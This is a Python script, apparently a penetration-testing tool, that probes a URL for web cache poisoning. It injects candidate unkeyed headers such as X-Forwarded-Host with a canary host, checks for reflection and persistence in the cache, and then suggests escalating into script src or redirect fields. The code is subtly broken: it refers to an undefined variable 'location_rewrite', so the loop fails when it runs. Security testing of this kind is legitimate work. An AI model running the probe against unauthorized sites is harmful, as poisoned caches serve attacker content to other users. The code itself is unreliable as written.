#!/usr/bin/env python3
"""Test candidate unkeyed headers for web cache poisoning behavior."""

import argparse
import random
import re
import string
import time
import urllib.error
import urllib.request

UA = "security-assessment-scripts/1.0"
CANARY = "zxpoison-canary.example"

DEFAULT_HEADERS = [
  "X-Forwarded-Host",
  "X-Forwarded-Scheme",
  "X-Forwarded-Proto",
  "X-Forwarded-Port",
  "X-Original-URL",
  "X-Rewrite-URL",
  "X-Host",
  "Fastly-Client-IP",
  "X-Real-IP",
  "True-Client-IP",
]


def cache_buster():
  return "".join(random.choices(string.ascii_lowercase, k=10))


def fetch(url, headers, timeout):
  request = urllib.request.Request(url, headers={"User-Agent": UA, **headers})
  try:
    response = urllib.request.urlopen(request, timeout=timeout)
    return getattr(response, "status", response.code), response.read(131072).decode("utf-8", "replace"), dict(response.headers)
  except urllib.error.HTTPError as exc:
    return exc.code, exc.read(131072).decode("utf-8", "replace"), dict(exc.headers)
  except (urllib.error.URLError, OSError):
    return None, "", {}


def cache_indicators(headers):
  interesting = {}
  for name, value in headers.items():
    lowered = name.lower()
    if lowered in ("cache-control", "age", "x-cache", "cf-cache-status", "x-varnish", "x-served-by", "x-cacheable", "x-drupal-cache"):
      interesting[name] = value
  return interesting


def main():
  parser = argparse.ArgumentParser(description="Probe unkeyed header reflection and caching for cache poisoning on an authorized target.")
  parser.add_argument("url", help="a cacheable URL on the authorized target")
  parser.add_argument("--headers", default=",".join(DEFAULT_HEADERS), help="comma-separated candidate unkeyed headers")
  parser.add_argument("--settle-time", type=float, default=2.0, help="seconds to wait before re-reading the cached entry")
  parser.add_argument("--timeout", type=float, default=10.0)
  args = parser.parse_args()

  candidates = [h.strip() for h in args.headers.split(",") if h.strip()]
  confirmed = []

  buster = cache_buster()
  separator = "&" if "?" in args.url else "?"
  keyed_url = f"{args.url}{separator}cb={buster}"

  status, baseline_body, baseline_headers = fetch(keyed_url, {}, args.timeout)
  print(f"[*] baseline (cache-buster cb={buster}): HTTP {status}, {len(baseline_body)} bytes")
  indicators = cache_indicators(baseline_headers)
  if indicators:
    print(f"[*] caching headers: {indicators}")
  else:
    print("[*] no explicit caching headers; probing anyway (implicit caching still possible)\n")

  for header in candidates:
    poison_url = f"{args.url}{separator}cb={cache_buster()}"
    inject_headers = {header: CANARY}
    status, body, resp_headers = fetch(poison_url, inject_headers, args.timeout)
    if not body:
      print(f"[ ] {header:<22} no response")
      continue

    reflected = CANARY in body or CANARY in str(resp_headers)

    time.sleep(args.settle_time)
    status2, body2, _ = fetch(poison_url, {}, args.timeout)
    persisted = CANARY in body2

    flags = []
    if reflected or location_rewrite:
      flags.append("reflected into response")
    if persisted:
      flags.append("CANARY PERSISTED ON RE-FETCH -> poisoned cache entry")
      confirmed.append(header)

    flag = "[!]" if persisted else ("[?]" if reflected else "[ ]")
    print(f"{flag} {header:<22} HTTP {status}->{status2}" + (f" ({'; '.join(flags)})" if flags else ""))

  print()
  if confirmed:
    print("[!] Cache poisoning confirmed via unkeyed header(s): " + ", ".join(confirmed))
    print("Escalate by reflecting into security-relevant fields (script src, redirects) - verify manually.")
  else:
    print("[+] No cached poisoning observed with these headers/buster strategy.")


if __name__ == "__main__":
  main()
